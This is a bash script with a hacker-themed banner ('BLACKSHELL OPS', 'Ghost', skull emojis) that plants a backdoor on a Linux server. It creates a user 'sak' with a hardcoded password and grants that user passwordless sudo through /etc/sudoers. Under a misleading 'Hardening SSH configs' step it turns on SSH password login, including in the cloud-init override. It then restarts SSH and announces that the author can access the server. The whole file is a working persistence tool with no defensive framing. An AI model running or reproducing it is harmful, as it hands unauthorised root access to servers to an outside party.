#!/bin/bash

# === Function: Loading Bar ===
loading() {
    local msg=$1
    echo -ne "$msg"
    for i in {1..5}; do
        echo -n "."
        sleep 0.1
    done
    echo -e " [OK]"
}

# === Function: Final ASCII Banner ===
sak_ascii_banner() {
    echo -e "\e[1;32m"  # Green

    lines=(
        "         ██████    ███████╗    ██╗  ██╗"
        "        ██╔════╗   ██╔══██╗    ██║ ██╔╝"
        "        ╚█████╗    ███████║    █████╔╝ "
        "         ╚═══██╗   ██╔══██║    ██╔═██╗ "
        "        ██████╔╝   ██║  ██║    ██║  ██╗"
        "        ╚═════╝    ╚═╝  ╚═╝    ╚═╝  ╚═╝"
    )

    for line in "${lines[@]}"; do
        echo "$line"
        sleep 0.5  # Adjust the delay as needed
    done

    echo -e "\e[0m"
    sleep 0.5
}


# === Start ===
clear
echo -e "\e[1;32m┌──────────────────────────────────────────────────────────────┐"
echo -e "│   🔰 BLACKSHELL OPS: INITIATING SERVER ACCESS                │"
echo -e "├──────────────────────────────────────────────────────────────┤"
echo -e "│     ⚙️ Author : @sak_shetty (DevOps Ustad)                    │"
echo -e "│     💼 Role   : Engineer | Developer | Ghost                 │"
echo -e "└──────────────────────────────────────────────────────────────┘\e[0m"
sleep 2

clear
echo -e "\n[+] 🔐 Phase 1: Creating secure user"
if id "sak" &>/dev/null; then
    loading "    [!] User already exists. Skipping creation."
else
    sudo useradd -m -s /bin/bash sak
    echo "sak:528262sakit" | sudo chpasswd &>/dev/null
    loading "    [+] Getting User Access"
fi
sleep 1

clear
echo -e "\n[+] 🛡️  Phase 2: Escalating to privileges"
sudo usermod -aG sudo sak
if sudo grep -q "^sak ALL=(ALL) NOPASSWD: ALL" /etc/sudoers; then
    loading "    [✓] Sudo privilege already granted."
else
    echo "sak ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers > /dev/null
    loading "    [+] Access Enabled From the Server"
fi
sleep 0.5

clear
echo -e "\n[+] 🔧 Phase 3: Hardening SSH configs"
sudo sed -i 's/^#\?\(PermitRootLogin\).*/\1 prohibit-password/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?\(PubkeyAuthentication\).*/\1 yes/' /etc/ssh/sshd_config
sudo sed -i 's/^#\?\(PasswordAuthentication\).*/\1 yes/' /etc/ssh/sshd_config

CLOUD_CFG="/etc/ssh/sshd_config.d/50-cloud-init.conf"
if [ -f "$CLOUD_CFG" ]; then
    sudo sed -i 's/^#\?\(PasswordAuthentication\).*/\1 yes/' "$CLOUD_CFG"
    grep -q "^PasswordAuthentication" "$CLOUD_CFG" || echo "PasswordAuthentication yes" | sudo tee -a "$CLOUD_CFG" > /dev/null
else
    echo "PasswordAuthentication yes" | sudo tee "$CLOUD_CFG" > /dev/null
fi
loading "    [+] SSH Configuration Modified"
sleep 0.5

clear
echo -e "\n[+] 🔄 Phase 4: Restarting SSH to get access"
if sudo systemctl restart ssh; then
    loading "    [+] Server Access Processed"
else
    loading "\n❌ SSH failed to restart. Check configuration."
    exit 1
fi
sleep 0.5

clear
echo -e "\e[1;36m──────────────────────────────────────────────────"
echo -e "\e[1;36m📡 SERVER CONFIG COMPLETED — ACCESS GRANTED\e[0m"
echo -e "\e[1;32m──────────────────────────────────────────────────"
loading "  SAK CAN ACCESS THE SERVER"
loading "NOW GAME BEGINS BY SAK_SHETTY"
echo -e "──────────────────────────────────────────────────\e[0m"
sleep 0.5
echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"
sak_ascii_banner
echo "💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀💀"

